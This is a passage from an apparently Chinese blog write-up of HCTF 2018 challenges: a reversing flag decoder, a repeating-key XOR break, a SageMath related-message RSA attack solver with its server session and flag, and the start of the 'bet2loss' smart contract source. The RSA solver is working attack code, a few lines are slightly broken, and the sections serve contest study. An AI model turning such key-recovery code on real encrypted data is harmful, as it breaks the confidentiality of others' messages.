0x39, 0x34,0x36, 0x38, 0x36, 0x20, 0x00, 0x29, 0x20, 0x29, 0x20, 0x29,0x20, 0x29, 0x20, 0x29, 0x20, 0x29, 0x20, 0x2D, 0x20, 0x31,0x36, 0x35, 0x33, 0x20, 0x29, 0x20, 0x00, 0x2D, 0x20, 0x36,0x35, 0x32, 0x31, 0x37, 0x20, 0x29, 0x20, 0x00, 0x29, 0x20,0x29, 0x20, 0x2D, 0x20, 0x34, 0x33, 0x38, 0x32, 0x37, 0x20,0x29, 0x20, 0x00, 0x36, 0x36, 0x35, 0x36, 0x32, 0x20, 0x29,0x20, 0x29, 0x20, 0x00 &#125;;</span><br><span class="line">	unsigned char *p;</span><br><span class="line">	int address[] = &#123; 0x140 ,0x14C ,0x153 ,0x162 ,0x177 ,0x18B ,0x1A9 ,0x1C8 ,0x1D3 ,0x1EB ,0x1FE ,0x25E ,0x207,0x21C,0x227,0x246,0x261,0x270,0x28B,0x298,0x2A3,0x2B1,0x25C,0x2BA,0x2C5,0x2D0,0x2D7,0x2F2,0x307,0x310,0x25E,0x327,0x346,0x3DC,0x34D,0x364,0x373,0x38F,0x3A6,0x3B3,0x3BF,0x3D0,0x3DF,0x3EF,0x400,0x44B,0x413,0x42C,0x43B,0x44F,0x452,0x490,0x45F,0x46C,0x47D,0x48E,0x497,0x49E,0x4B5,0x4CB,0x445,0x445,0x4D6,0x44D,0x44D,0x494,0x4E5,0x44F &#125;;</span><br><span class="line">	int i;</span><br><span class="line">	for (i = 0; i &lt; 68; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		p = &amp;secret[0] + address[i]-0x140;</span><br><span class="line">		cout &lt;&lt; p;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>得到完整的算术表达式，用python算出flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">44646</span> + ( <span class="number">64094</span> + ( <span class="number">71825</span> * ( ( <span class="number">15873</span> + ( <span class="number">21793</span> * ( <span class="number">7234</span> + ( <span class="number">17649</span> * ( ( <span class="number">2155</span> + ( <span class="number">74767</span> * ( <span class="number">35392</span> + ( <span class="number">88216</span> * ( <span class="number">83920</span> + ( <span class="number">16270</span> + ( <span class="number">20151</span> * ( <span class="number">5268</span> + ( <span class="number">90693</span> * ( <span class="number">82773</span> + ( <span class="number">716</span> + ( <span class="number">27377</span> * ( <span class="number">44329</span> + ( <span class="number">49366</span> * ( ( ( <span class="number">38790</span> + ( <span class="number">70247</span> * ( <span class="number">97233</span> + ( <span class="number">18347</span> + ( <span class="number">22117</span> * ( ( ( <span class="number">72576</span> + ( ( <span class="number">47541</span> + ( <span class="number">46975</span> + ( <span class="number">53769</span> * ( <span class="number">94005</span> + ( ( <span class="number">72914</span> + ( <span class="number">5137</span> + ( <span class="number">87544</span> * ( ( <span class="number">71583</span> + ( <span class="number">20370</span> + ( <span class="number">37968</span> * ( <span class="number">17478</span> + ( ( <span class="number">40532</span> + ( <span class="number">10089</span> + ( <span class="number">13332</span> * ( ( <span class="number">24170</span> + ( <span class="number">46845</span> * ( <span class="number">16048</span> + ( <span class="number">23142</span> * ( <span class="number">31895</span> + ( <span class="number">62386</span> * ( <span class="number">12179</span> + ( <span class="number">94552</span> + ( ( ( <span class="number">52918</span> + ( <span class="number">91580</span> + ( ( ( <span class="number">38412</span> + ( <span class="number">91537</span> * ( <span class="number">70</span> + ( <span class="number">98594</span> * ( ( <span class="number">35275</span> + ( <span class="number">62912</span> * ( <span class="number">4755</span> + ( <span class="number">16737</span> * ( <span class="number">27595</span> + ( ( <span class="number">43551</span> + ( <span class="number">64482</span> * <span class="number">3550</span> ) ) - <span class="number">21031</span> ) ) ) ) ) ) - <span class="number">57553</span> ) ) ) ) ) - <span class="number">89883</span> ) - <span class="number">38900</span> ) ) ) - <span class="number">19517</span> ) - <span class="number">79082</span> ) ) ) ) ) ) ) ) ) - <span class="number">70643</span> ) ) ) ) - <span class="number">55350</span> ) ) ) ) ) - <span class="number">40301</span> ) ) ) ) - <span class="number">83065</span> ) ) ) ) ) - <span class="number">52460</span> ) ) - <span class="number">49428</span> ) - <span class="number">94686</span> ) ) ) ) ) ) - <span class="number">1653</span> ) - <span class="number">65217</span> ) ) ) ) ) ) ) ) ) ) ) ) ) ) ) - <span class="number">43827</span> ) ) ) ) ) - <span class="number">66562</span> ) ) ) </span><br><span class="line">s=hex(a)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>flag:hctf{P0l1sh_Duck_Tast3s_D3l1ci0us_D0_U_Th1nk?}</code></p>
</blockquote>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="xor-game"><a href="#xor-game" class="headerlink" title="xor game"></a>xor game</h2><p>加密方式是一个key对明文循环异或。可以通过统计词频逐步确定key的长度，key每一字节可能的字符，并最终确定key。<br>详见：<a href="https://findneo.github.io/171005NuptVigenereWP/" target="_blank" rel="noopener">https://findneo.github.io/171005NuptVigenereWP/</a> </p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">## xor?rsa</span><br><span class="line"></span><br><span class="line">``` python</span><br><span class="line">gcd(e,(p-1)*(q-1)) ==  1 或 5</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))                                                                                                                                           </span><br><span class="line">e=<span class="number">5</span>                                                                                                                                                                              </span><br><span class="line">g1 = x**e - c1                                                                                                                                                                   </span><br><span class="line">g2 = (x + y)**e - c2                                                                                                                                                             </span><br><span class="line">                                                                                                                                                                                 </span><br><span class="line">q1 = g1.change_ring(PRZZ)                                                                                                                                                        </span><br><span class="line">q2 = g2.change_ring(PRZZ)                 </span><br><span class="line"> </span><br><span class="line">h = q2.resultant(q1)</span><br><span class="line"><span class="comment"># need to switch to univariate polynomial ring</span></span><br><span class="line"><span class="comment"># because .small_roots is implemented only for univariate</span></span><br><span class="line">h = h.univariate_polynomial() <span class="comment"># x is hopefully eliminated</span></span><br><span class="line">h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">h = h.monic()</span><br><span class="line"> </span><br><span class="line">roots = h.small_roots(X=<span class="number">2</span>**<span class="number">40</span>, beta=<span class="number">0.3</span>)</span><br><span class="line"><span class="keyword">assert</span> roots, <span class="string">"Failed1"</span></span><br><span class="line"><span class="keyword">print</span> roots</span><br><span class="line">diff = roots[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> diff &gt; <span class="number">2</span>**<span class="number">32</span>:</span><br><span class="line">^Idiff = -diff</span><br><span class="line">^Ic1, c2 = c2, c1</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Difference:"</span>, diff</span><br><span class="line"></span><br><span class="line">x = PRx.gen() <span class="comment"># otherwise write xn</span></span><br><span class="line">g1 = x**e - c1</span><br><span class="line">g2 = (x + diff)**e - c2</span><br><span class="line"> </span><br><span class="line"><span class="comment"># gcd</span></span><br><span class="line"><span class="keyword">while</span> g2:</span><br><span class="line">    g1, g2 = g2, g1 % g2</span><br><span class="line"> </span><br><span class="line">g = g1.monic()</span><br><span class="line"><span class="keyword">assert</span> g.degree() == <span class="number">1</span>, <span class="string">"Failed 2"</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># g = xn - msg</span></span><br><span class="line">msg = -g[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># convert to str</span></span><br><span class="line">h = int(msg)</span><br><span class="line"><span class="keyword">print</span> h</span><br><span class="line"><span class="keyword">print</span> h+diff+int(n)</span><br><span class="line"><span class="keyword">print</span> pow(h,e,n)==c2</span><br><span class="line"><span class="keyword">print</span> pow(h+diff+int(n),e,n)==c1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[555991320628]</span><br><span class="line">Difference: 30290716620841793899146321994568496023252750053596786876611475641947678118979038294637697826463401155985354968691924997404322605452761001870059955726773324447235980051453346857315677224128047844328773148916021249443603911449637550383591704762386567005058018282308230728051353460058754497672179057700421161074247576457866689070241760427131473043482158810401561313321107974516682297500997022575554884396342862329278222526955343597739332964020816251046425193373642417717381045917123341522209552123269466378004786062763182259628931179308017861705958534248179294164338076634721107705015038219232572426688683766371284897691</span><br><span class="line">2932093288739759017131922832119390508643918321984410853</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2583475209918998219801122954379479992650705870599189051232760719646159719619265755438890096354620462669930665081971091894103757999670741311927625969755788747121762969679475351111489399600154562955287885202707223159968667071096275208629651189581238338521064833101272863069918738346837635731886529517213961300297787649206078555692261069713014027837983048971538947661147625228754443387901174007943169362738696168181450776372832045356985606263519804479231156806800627979267259445511274742157175638821617100281049528076791498180668899828383550671492688471895766846725</span><br><span class="line">29320932887397590171319228321193905086439183219844108532583475209918998219801122954379479992650705870599189051232760719646159719619265755438890096354620462669930665081971091894103757999670741311927625969755788747121762969679475351111489399600154562955287885202707223159968667071096275208629651189581238338521064833101272863069918738346837635731886529517213961300297787649206078555692261069713014027837983048971538947661147625228754443387901174007943169362738696168181450776372832045356985606263519804479231156806800627979267259445511274742157175638821617100281049528076791498180668899828383550671492688471339775526097</span><br><span class="line">True</span><br><span class="line">True</span><br><span class="line"></span><br><span class="line">m1&gt;n</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nc rsa.2018.hctf.io 10086</span><br><span class="line">Welcome to flag getting system</span><br><span class="line">give me your token &gt; uvm73jg2AFMECo71DIZRZh39MRqFOI2w</span><br><span class="line">n=25592302757401106056280234286012383062484235707312989164780308492200872167178574218000602787441725428426717090949654793218739897595107846312672513664085694001801608518590887961938014572669134367079646488310507850336050513025245626467377203241863607999325036917193601505657352182776079774009206570703186219337621551483393737290768330888410101854796481874297267599196619674335794044792069495519108109223425797503203570902994567568592084357934714964501535669657986930473369655871619588840794482884419083552554342422741496026024222914198234788143213719654823547100803532256499706071071498660891381652493208839656686738591</span><br><span class="line">c1=11690907386363649212644384569199890345770981654517160939164832907826289543551982063610220071961849700921425395140710365953159185666787437146246103625442409812945763501692710328379204747353203817255953902210586779053720571365060460732531241991577093405485858643711950523138375131702989487907339644510108399052427817874710822165262868315224968612849619299795358325603907678116650332797927084567328392462191457872943785013598632574175405870522070537466045471567735827773482872427192699293399500104479883708854100100037846415639145150417103704144637686300025634446944846253236091651808972028854707078113064878063321580768</span><br><span class="line">c2=23770070496907514366297412141037667449588865437018376514390695607679676986001301621556277980415958296151188882273930436528902856816100291709779231712294522684117809069750177322126984516684260974647430093063414228366055366719654277299019192226831695082426012957631732846185788410351093879858771697093954122318192675776953344922612983099660105822719741335067051112337020739320099859836973578421498466368851839142137257484447051174094093504567507429730727091330591571603022555924970273436929750572410470501844270943580821467782713936322388728653073754746083727342190374906283014672336536995144296014243057684586151967259</span><br><span class="line">now give me you answer</span><br><span class="line">19192367044417009574476120231142453777715164401167583116818642067057559425607428214230005291096592117565507572856314816467238405776265673021259189682385525688967473815563074054515033828997755186215692527330397977283770408982658352080214663787539650267242917359134595104066485839193632212316099201917721667135306930187402153500605057513457619657478967568643046456602317538660008316345868692641873925382002676220521051279760109657536301500377507578497888384179794081375588346813744918914579093924393594445064745990498754455457360554748737767889831035781211814570683813231972744037861524811042088953081214510724634343988</span><br><span class="line">19192367044417009574476120231142453777715164401167583116818642067057559425607428214230005291096592117565507572856314816467238405776265673021259189682385525688967473815563074054515033828997755186215692527330397977283770408982658352080214663787539650267242917359134595104066485839193632212316099201917721667135306930187402153500605057513457619657478967568643046456602317538660008316345868692641873925382002676220521051279760109657536301500377507578497888384179794081375588346813744918914579093924393594445064745990498754455457360554748737767889831035781211814570683813231972744037861524811042088953081214511375412065022</span><br><span class="line">hctf&#123;1a105ae83a735e0b914f4715aae936b67f297aa424dc10c119ca257ae7f6e508&#125;</span><br></pre></td></tr></table></figure>
<p>当difference很大时，<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[650777721034]</span><br><span class="line">Difference: 25592302757401106056280234286012383062484235707312989164780308492200872167178574218000602787441725428426717090949654793218739897595107846312672513664085694001801608518590887961938014572669134367079646488310507850336050513025245626467377203241863607999325036917193601505657352182776079774009206570703186219337621551483393737290768330888410101854796481874297267599196619674335794044792069495519108109223425797503203570902994567568592084357934714964501535669657986930473369655871619588840794482884419083552554342422741496026024222914198234788143213719654823547100803532256499706071071498660891381652493208839005909017557</span><br><span class="line">19192367044417009574476120231142453777715164401167583116818642067057559425607428214230005291096592117565507572856314816467238405776265673021259189682385525688967473815563074054515033828997755186215692527330397977283770408982658352080214663787539650267242917359134595104066485839193632212316099201917721667135306930187402153500605057513457619657478967568643046456602317538660008316345868692641873925382002676220521051279760109657536301500377507578497888384179794081375588346813744918914579093924393594445064745990498754455457360554748737767889831035781211814570683813231972744037861524811042088953081214511375412065022</span><br><span class="line">19192367044417009574476120231142453777715164401167583116818642067057559425607428214230005291096592117565507572856314816467238405776265673021259189682385525688967473815563074054515033828997755186215692527330397977283770408982658352080214663787539650267242917359134595104066485839193632212316099201917721667135306930187402153500605057513457619657478967568643046456602317538660008316345868692641873925382002676220521051279760109657536301500377507578497888384179794081375588346813744918914579093924393594445064745990498754455457360554748737767889831035781211814570683813231972744037861524811042088953081214510724634343988</span><br><span class="line">True</span><br><span class="line">True</span><br></pre></td></tr></table></figure></p>
<p><code>m2 =  h
m1 =   h+diff+int(n)</code></p>
<p>搞定</p>
<blockquote>
<p><code>flag:hctf{1a105ae83a735e0b914f4715aae936b67f297aa424dc10c119ca257ae7f6e508}</code></p>
</blockquote>
<h1 id="blockchain"><a href="#blockchain" class="headerlink" title="blockchain"></a>blockchain</h1><h2 id="bet2loss"><a href="#bet2loss" class="headerlink" title="bet2loss"></a>bet2loss</h2><p>描述<br>0x006b9bc418e43e92cf8d380c56b8d4be41fda319 for ropsten and open source<br>D2GBToken is onsale. Now New game is coming.<br>We’ll give everyone 1000 D2GBTOKEN for playing. only God of Gamblers can get flag.<br>URL <a href="http://bet2loss.2018.hctf.io" target="_blank" rel="noopener">http://bet2loss.2018.hctf.io</a><br>合约部署在ropsten测试网络，地址为0x006b9bc418e43e92cf8d380c56b8d4be41fda319，而且是开源的。</p>
<p>访问网站<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Welcome to Bet2Loss Game!</span><br><span class="line">only winner can get flag!</span><br><span class="line">1、Bet2Loss Game is based on Ropsten. open source on xxx.</span><br><span class="line">2、Every New gamer will airdrop 1000 B2GB for betting.</span><br><span class="line">3、Game Rule: Set a modulo (2 - 40), guess a number (0-(modulo-1)), and set a betnumber (1 - balanceOf(you) and less than 100000). If you win, you will get betnumber*modulo B2GB.</span><br><span class="line">4、Example: set 2 as modulo, guess 1, and bet 100 B2GB. if 1 == random_number%modulo, you will get 100*2, which is 200 B2GB.</span><br><span class="line">5、Ahhhh, if balanceOf(you) &gt; 10000000, you can use the function PayForFlag. Admin will post the flag to your email.</span><br><span class="line"></span><br><span class="line">ps: you need install a eth wallet, just like metamask in chrome webstore and a little test eth for gasprice.</span><br><span class="line">ps: you can get the test eth from every ether faucet.(just like https://faucet.metamask.io/)</span><br></pre></td></tr></table></figure></p>
<p>这个页面里面可以下注，进行游戏（ps: 一看参数就知道是参考dice2win这个游戏）<br>每个新玩家空投1000 B2GB。目标<code>balanceOf(you) &gt; 10000000</code>，然后调用<code>PayForFlag</code>。</p>
<p>接下来就是找漏洞点了。</p>
<p>直接去区块链浏览器中看智能合约源码。（顺带吐槽下，为啥区块链的题目部署到同一个测试网络中，这样不是直接可以看别的队伍的payload么）。<br><a href="https://ropsten.etherscan.io/address/0x006b9bc418e43e92cf8d380c56b8d4be41fda319%23code" target="_blank" rel="noopener">https://ropsten.etherscan.io/address/0x006b9bc418e43e92cf8d380c56b8d4be41fda319%23code</a><br>源码如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"><span class="comment">// Wow. Welcome to hctf2018</span></span><br><span class="line"></span><br><span class="line">library SafeMath &#123;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">mul</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 c = a * b;</span><br><span class="line">    require(c / a == b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">div</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    require(b &gt; <span class="number">0</span>); </span><br><span class="line">    uint256 c = a / b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">sub</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    require(b &lt;= a);</span><br><span class="line">    uint256 c = a - b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">add</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    uint256 c = a + b;</span><br><span class="line">    require(c &gt;= a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ERC20&#123;</span><br><span class="line">  <span class="keyword">using</span> SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line"></span><br><span class="line">  mapping (address =&gt; uint256) <span class="keyword">public</span> balances;</span><br><span class="line"></span><br><span class="line">  uint256 <span class="keyword">public</span> _totalSupply;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">totalSupply</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> _totalSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">balanceOf</span><span class="params">(address owner)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[owner];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">transfer</span><span class="params">(address _to, uint _value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span> success)</span></span>&#123;</span><br><span class="line">      balances[msg.sender] = balances[msg.sender].sub(_value);</span><br><span class="line">      balances[_to] = balances[_to].add(_value);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B2GBToken is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">string</span> <span class="keyword">public</span> constant name = <span class="string">"test"</span>;</span><br><span class="line">  <span class="built_in">string</span> <span class="keyword">public</span> constant symbol = <span class="string">"test"</span>;</span><br><span class="line">  uint8 <span class="keyword">public</span> constant decimals = <span class="number">18</span>;</span><br><span class="line">  uint256 <span class="keyword">public</span> constant _airdropAmount = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">  uint256 <span class="keyword">public</span> constant INITIAL_SUPPLY = <span class="number">20000000000</span> * (<span class="number">10</span> ** uint256(decimals));</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; <span class="keyword">bool</span>) initialized;</span><br><span class="line"></span><br><span class="line">  constructor() <span class="keyword">public</span> &#123;</span><br><span class="line">    initialized[msg.sender] = <span class="literal">true</span>;</span><br><span class="line">    _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">    balances[msg.sender] = INITIAL_SUPPLY;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// airdrop</span></span><br><span class="line">  <span class="function">function <span class="title">AirdropCheck</span><span class="params">()</span> internal <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span> success)</span></span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (!initialized[msg.sender]) &#123;</span><br><span class="line">            initialized[msg.sender] = <span class="literal">true</span>;</span><br><span class="line">            balances[msg.sender] = _airdropAmount;</span><br><span class="line">            _totalSupply += _airdropAmount;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Bet2Loss is B2GBToken&#123;</span><br><span class="line">    uint constant MIN_JACKPOT_BET = <span class="number">0.1</span> ether;</span><br><span class="line">    uint constant MIN_BET = <span class="number">1</span>;</span><br><span class="line">    uint constant MAX_BET = <span class="number">100000</span>;</span><br><span class="line">    uint constant MAX_MODULO = <span class="number">100</span>;</span><br><span class="line">    uint constant BET_EXPIRATION_BLOCKS = <span class="number">250</span>;</span><br><span class="line">    address constant DUMMY_ADDRESS = <span class="number">0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C</span>;</span><br><span class="line">    address <span class="keyword">public</span> owner;</span><br><span class="line">    address <span class="keyword">private</span> nextOwner;</span><br><span class="line">    uint <span class="keyword">public</span> maxProfit;</span><br><span class="line">    address <span class="keyword">public</span> secretSigner;</span><br><span class="line">    uint128 <span class="keyword">public</span> jackpotSize;</span><br><span class="line">    uint128 <span class="keyword">public</span> lockedInBets;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Bet</span> &#123;</span></span><br><span class="line">        uint betnumber;</span><br><span class="line">        uint8 modulo;</span><br><span class="line">        uint40 placeBlockNumber;</span><br><span class="line">        uint40 mask;</span><br><span class="line">        address gambler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping (uint =&gt; Bet) bets;</span><br><span class="line"></span><br><span class="line">    <span 